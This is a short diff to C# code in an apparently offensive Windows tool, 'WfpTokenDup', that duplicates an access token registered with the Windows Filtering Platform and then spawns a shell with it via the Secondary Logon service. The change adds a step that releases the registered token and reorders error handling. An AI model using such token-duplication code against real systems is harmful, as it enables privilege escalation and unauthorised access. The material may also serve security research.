@@ -106,14 +106,21 @@ namespace WfpTokenDup.Library
                 }
 
                 if (hDupToken == IntPtr.Zero)
-                {
                     Console.WriteLine("[-] The registered toke is not found. This technique is not stable, so try again.");
-                    break;
-                }
                 else
-                {
                     Console.WriteLine("[+] Got the registered token (handle = 0x{0}).", hDupToken.ToString("X"));
-                }
+
+                Console.WriteLine("[>] Releasing the registered token from WFP.");
+
+                status = Utilities.WfpUnregisterToken(hWfpAle, in modifiedId);
+
+                if (!status)
+                    Console.WriteLine("[-] Failed to release the registered token.");
+                else
+                    Console.WriteLine("[+] The registered token is released successfully.");
+
+                if (hDupToken == IntPtr.Zero)
+                    break;
 
                 Console.WriteLine("[>] Trying to spawn token assigned shell with Secondary Logon service.");
 
